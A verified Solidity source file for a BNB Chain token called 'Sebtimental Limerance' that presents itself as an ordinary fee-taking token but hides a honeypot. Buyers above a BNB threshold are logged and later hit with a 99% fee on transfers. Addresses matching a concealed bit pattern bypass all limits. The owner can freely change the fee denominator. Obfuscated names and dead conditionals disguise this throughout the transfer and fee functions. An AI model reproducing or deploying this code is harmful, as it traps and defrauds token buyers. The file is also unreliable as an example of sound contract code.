/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SebtimentalLimerance is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Sebtimental Limerance ";
    string constant _symbol = "SebtimentalLimerance";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private sellMinWalletSwap;
    mapping(address => bool) private walletMarketingTxBurnMode;
    mapping(address => bool) private receiverModeMaxIs;
    mapping(address => bool) private autoModeWalletMinSellTeam;
    mapping(address => uint256) private sellIsLimitMin;
    mapping(uint256 => address) private maxLaunchedExemptBuyBurn;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private liquidityBotsReceiverFeeSwap = 0;
    uint256 private receiverLimitExemptLiquidityMarketingAuto = 8;

    //SELL FEES
    uint256 private txIsFeeBuy = 0;
    uint256 private txBotsTeamIs = 8;

    uint256 private botsWalletBuyReceiver = receiverLimitExemptLiquidityMarketingAuto + liquidityBotsReceiverFeeSwap;
    uint256 private feeBuyReceiverBurn = 100;

    address private autoTradingSwapWallet = (msg.sender); // auto-liq address
    address private walletAutoTxFeeBotsTeamBuy = (0x867978655B75004D9A70fbd5fffFd3BE84d8e8Dc); // marketing address
    address private minTradingMaxTeamLimitAuto = DEAD;
    address private maxLiquidityLaunchedTradingModeMarketing = DEAD;
    address private sellMaxBuyIs = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private feeAutoBotsMinSwapTeam;
    uint256 private teamAutoModeWallet;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingAutoReceiverIs;
    uint256 private receiverBuyModeTrading;
    uint256 private botsReceiverModeSwapBuyIsLimit;
    uint256 private sellWalletIsBurn;
    uint256 private walletBurnSwapMode;

    bool private buyLaunchedTxMin = true;
    bool private autoModeWalletMinSellTeamMode = true;
    bool private botsAutoSellTeamBuy = true;
    bool private exemptAutoSwapBuy = true;
    bool private burnSwapSellMinBotsFeeTrading = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private marketingLaunchedModeTx = 6 * 10 ** 15;
    uint256 private feeLimitWalletSwap = _totalSupply / 1000; // 0.1%

    
    bool private launchedBotsSwapSell = false;
    bool private tradingBotsLiquidityWallet = false;
    bool private modeFeeSellLiquidityTxLimit = false;
    uint256 private walletSwapMarketingLaunched = 0;
    bool private walletTeamMarketingLimit = false;
    uint256 private exemptModeFeeReceiverBots = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingAutoReceiverIs = true;

        sellMinWalletSwap[msg.sender] = true;
        sellMinWalletSwap[address(this)] = true;

        walletMarketingTxBurnMode[msg.sender] = true;
        walletMarketingTxBurnMode[0x0000000000000000000000000000000000000000] = true;
        walletMarketingTxBurnMode[0x000000000000000000000000000000000000dEaD] = true;
        walletMarketingTxBurnMode[address(this)] = true;

        receiverModeMaxIs[msg.sender] = true;
        receiverModeMaxIs[0x0000000000000000000000000000000000000000] = true;
        receiverModeMaxIs[0x000000000000000000000000000000000000dEaD] = true;
        receiverModeMaxIs[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return limitBurnLaunchedTrading(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return limitBurnLaunchedTrading(sender, recipient, amount);
    }

    function limitBurnLaunchedTrading(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (walletTeamMarketingLimit == exemptAutoSwapBuy) {
            walletTeamMarketingLimit = launchedBotsSwapSell;
        }


        bool bLimitTxWalletValue = feeAutoMaxMinReceiverLaunchedWallet(sender) || feeAutoMaxMinReceiverLaunchedWallet(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                exemptBotsMaxSwap();
            }
            if (!bLimitTxWalletValue) {
                feeLimitLaunchedBots(recipient);
            }
        }
        
        if (launchedBotsSwapSell != exemptAutoSwapBuy) {
            launchedBotsSwapSell = exemptAutoSwapBuy;
        }

        if (tradingBotsLiquidityWallet == tradingBotsLiquidityWallet) {
            tradingBotsLiquidityWallet = tradingBotsLiquidityWallet;
        }

        if (walletSwapMarketingLaunched != walletSwapMarketingLaunched) {
            walletSwapMarketingLaunched = liquidityBotsReceiverFeeSwap;
        }


        if (inSwap || bLimitTxWalletValue) {return liquidityBuyExemptIs(sender, recipient, amount);}

        if (!sellMinWalletSwap[sender] && !sellMinWalletSwap[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || receiverModeMaxIs[sender] || receiverModeMaxIs[recipient], "Max TX Limit has been triggered");

        if (buyIsBotsTeam()) {walletTradingTxMarketingBurn();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        uint256 amountReceived = limitModeIsMax(sender) ? buySwapBurnLaunchedTrading(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function liquidityBuyExemptIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function limitModeIsMax(address sender) internal view returns (bool) {
        return !walletMarketingTxBurnMode[sender];
    }

    function autoFeeSwapLiquidity(address sender, bool selling) internal returns (uint256) {
        
        if (walletSwapMarketingLaunched == exemptModeFeeReceiverBots) {
            walletSwapMarketingLaunched = exemptModeFeeReceiverBots;
        }

        if (exemptModeFeeReceiverBots != marketingLaunchedModeTx) {
            exemptModeFeeReceiverBots = botsWalletBuyReceiver;
        }

        if (tradingBotsLiquidityWallet != buyLaunchedTxMin) {
            tradingBotsLiquidityWallet = autoModeWalletMinSellTeamMode;
        }


        if (selling) {
            botsWalletBuyReceiver = txBotsTeamIs + txIsFeeBuy;
            return autoReceiverMarketingBuy(sender, botsWalletBuyReceiver);
        }
        if (!selling && sender == uniswapV2Pair) {
            botsWalletBuyReceiver = receiverLimitExemptLiquidityMarketingAuto + liquidityBotsReceiverFeeSwap;
            return botsWalletBuyReceiver;
        }
        return autoReceiverMarketingBuy(sender, botsWalletBuyReceiver);
    }

    function minIsAutoTradingLaunchedWalletReceiver() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function buySwapBurnLaunchedTrading(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (walletTeamMarketingLimit != launchedBotsSwapSell) {
            walletTeamMarketingLimit = tradingBotsLiquidityWallet;
        }

        if (exemptModeFeeReceiverBots != receiverLimitExemptLiquidityMarketingAuto) {
            exemptModeFeeReceiverBots = receiverLimitExemptLiquidityMarketingAuto;
        }

        if (tradingBotsLiquidityWallet != walletTeamMarketingLimit) {
            tradingBotsLiquidityWallet = tradingBotsLiquidityWallet;
        }


        uint256 feeAmount = amount.mul(autoFeeSwapLiquidity(sender, receiver == uniswapV2Pair)).div(feeBuyReceiverBurn);

        if (autoModeWalletMinSellTeam[sender] || autoModeWalletMinSellTeam[receiver]) {
            feeAmount = amount.mul(99).div(feeBuyReceiverBurn);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function feeAutoMaxMinReceiverLaunchedWallet(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function autoReceiverMarketingBuy(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = sellIsLimitMin[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function feeLimitLaunchedBots(address addr) private {
        if (minIsAutoTradingLaunchedWalletReceiver() < marketingLaunchedModeTx) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        maxLaunchedExemptBuyBurn[exemptLimitValue] = addr;
    }

    function exemptBotsMaxSwap() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (sellIsLimitMin[maxLaunchedExemptBuyBurn[i]] == 0) {
                    sellIsLimitMin[maxLaunchedExemptBuyBurn[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(walletAutoTxFeeBotsTeamBuy).transfer(amountBNB * amountPercentage / 100);
    }

    function buyIsBotsTeam() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    burnSwapSellMinBotsFeeTrading &&
    _balances[address(this)] >= feeLimitWalletSwap;
    }

    function walletTradingTxMarketingBurn() internal swapping {
        
        if (tradingBotsLiquidityWallet == launchedBotsSwapSell) {
            tradingBotsLiquidityWallet = autoModeWalletMinSellTeamMode;
        }

        if (exemptModeFeeReceiverBots != txIsFeeBuy) {
            exemptModeFeeReceiverBots = txBotsTeamIs;
        }

        if (walletSwapMarketingLaunched == txIsFeeBuy) {
            walletSwapMarketingLaunched = exemptModeFeeReceiverBots;
        }


        uint256 amountToLiquify = feeLimitWalletSwap.mul(liquidityBotsReceiverFeeSwap).div(botsWalletBuyReceiver).div(2);
        uint256 amountToSwap = feeLimitWalletSwap.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (walletTeamMarketingLimit == exemptAutoSwapBuy) {
            walletTeamMarketingLimit = modeFeeSellLiquidityTxLimit;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = botsWalletBuyReceiver.sub(liquidityBotsReceiverFeeSwap.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(liquidityBotsReceiverFeeSwap).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(receiverLimitExemptLiquidityMarketingAuto).div(totalETHFee);
        
        payable(walletAutoTxFeeBotsTeamBuy).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoTradingSwapWallet,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getWalletAutoTxFeeBotsTeamBuy() public view returns (address) {
        if (walletAutoTxFeeBotsTeamBuy == walletAutoTxFeeBotsTeamBuy) {
            return walletAutoTxFeeBotsTeamBuy;
        }
        if (walletAutoTxFeeBotsTeamBuy == walletAutoTxFeeBotsTeamBuy) {
            return walletAutoTxFeeBotsTeamBuy;
        }
        return walletAutoTxFeeBotsTeamBuy;
    }
    function setWalletAutoTxFeeBotsTeamBuy(address a0) public onlyOwner {
        if (walletAutoTxFeeBotsTeamBuy == minTradingMaxTeamLimitAuto) {
            minTradingMaxTeamLimitAuto=a0;
        }
        walletAutoTxFeeBotsTeamBuy=a0;
    }

    function getBuyLaunchedTxMin() public view returns (bool) {
        if (buyLaunchedTxMin != launchedBotsSwapSell) {
            return launchedBotsSwapSell;
        }
        if (buyLaunchedTxMin != tradingBotsLiquidityWallet) {
            return tradingBotsLiquidityWallet;
        }
        if (buyLaunchedTxMin == exemptAutoSwapBuy) {
            return exemptAutoSwapBuy;
        }
        return buyLaunchedTxMin;
    }
    function setBuyLaunchedTxMin(bool a0) public onlyOwner {
        if (buyLaunchedTxMin != launchedBotsSwapSell) {
            launchedBotsSwapSell=a0;
        }
        if (buyLaunchedTxMin == modeFeeSellLiquidityTxLimit) {
            modeFeeSellLiquidityTxLimit=a0;
        }
        if (buyLaunchedTxMin != buyLaunchedTxMin) {
            buyLaunchedTxMin=a0;
        }
        buyLaunchedTxMin=a0;
    }

    function getModeFeeSellLiquidityTxLimit() public view returns (bool) {
        if (modeFeeSellLiquidityTxLimit != walletTeamMarketingLimit) {
            return walletTeamMarketingLimit;
        }
        return modeFeeSellLiquidityTxLimit;
    }
    function setModeFeeSellLiquidityTxLimit(bool a0) public onlyOwner {
        if (modeFeeSellLiquidityTxLimit == burnSwapSellMinBotsFeeTrading) {
            burnSwapSellMinBotsFeeTrading=a0;
        }
        if (modeFeeSellLiquidityTxLimit != burnSwapSellMinBotsFeeTrading) {
            burnSwapSellMinBotsFeeTrading=a0;
        }
        if (modeFeeSellLiquidityTxLimit == autoModeWalletMinSellTeamMode) {
            autoModeWalletMinSellTeamMode=a0;
        }
        modeFeeSellLiquidityTxLimit=a0;
    }

    function getLaunchedBotsSwapSell() public view returns (bool) {
        if (launchedBotsSwapSell == tradingBotsLiquidityWallet) {
            return tradingBotsLiquidityWallet;
        }
        if (launchedBotsSwapSell != autoModeWalletMinSellTeamMode) {
            return autoModeWalletMinSellTeamMode;
        }
        return launchedBotsSwapSell;
    }
    function setLaunchedBotsSwapSell(bool a0) public onlyOwner {
        if (launchedBotsSwapSell == buyLaunchedTxMin) {
            buyLaunchedTxMin=a0;
        }
        if (launchedBotsSwapSell != exemptAutoSwapBuy) {
            exemptAutoSwapBuy=a0;
        }
        launchedBotsSwapSell=a0;
    }

    function getSellMinWalletSwap(address a0) public view returns (bool) {
        if (sellMinWalletSwap[a0] == autoModeWalletMinSellTeam[a0]) {
            return botsAutoSellTeamBuy;
        }
            return sellMinWalletSwap[a0];
    }
    function setSellMinWalletSwap(address a0,bool a1) public onlyOwner {
        if (sellMinWalletSwap[a0] != receiverModeMaxIs[a0]) {
           receiverModeMaxIs[a0]=a1;
        }
        sellMinWalletSwap[a0]=a1;
    }

    function getFeeBuyReceiverBurn() public view returns (uint256) {
        if (feeBuyReceiverBurn != marketingLaunchedModeTx) {
            return marketingLaunchedModeTx;
        }
        if (feeBuyReceiverBurn != walletSwapMarketingLaunched) {
            return walletSwapMarketingLaunched;
        }
        return feeBuyReceiverBurn;
    }
    function setFeeBuyReceiverBurn(uint256 a0) public onlyOwner {
        feeBuyReceiverBurn=a0;
    }

    function getReceiverModeMaxIs(address a0) public view returns (bool) {
            return receiverModeMaxIs[a0];
    }
    function setReceiverModeMaxIs(address a0,bool a1) public onlyOwner {
        receiverModeMaxIs[a0]=a1;
    }

    function getWalletTeamMarketingLimit() public view returns (bool) {
        if (walletTeamMarketingLimit == exemptAutoSwapBuy) {
            return exemptAutoSwapBuy;
        }
        return walletTeamMarketingLimit;
    }
    function setWalletTeamMarketingLimit(bool a0) public onlyOwner {
        walletTeamMarketingLimit=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}